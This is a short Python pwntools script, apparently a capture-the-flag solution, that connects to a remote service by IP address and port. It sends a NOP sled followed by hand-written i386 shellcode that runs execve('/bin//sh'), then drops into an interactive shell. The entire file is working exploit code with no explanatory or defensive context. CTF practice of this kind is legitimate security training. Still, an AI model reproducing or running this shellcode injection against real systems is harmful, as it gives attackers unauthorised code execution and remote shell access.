#!/usr/bin/python3
from pwn import *

context.binary = elf = ELF("./vuln", checksec = False)

# con = process()
#gdb.attach(con, gdbscript = "start")

#sh = ssh(host='pwnable.kr',user='passcode',port=2222,password='guest')
#con = sh.process("path")

con = remote("34.125.199.248", 1234)

shellcode = asm(
    '''
    mov eax, 0x0b
    push 6845231
    push 1852400175
    mov ebx, esp
    xor ecx, ecx
    xor edx, edx
    int 0x80
    ''', arch = 'i386'
)

con.sendafter(b"shellcode:", b'\x90' * 256 + shellcode)

con.interactive()
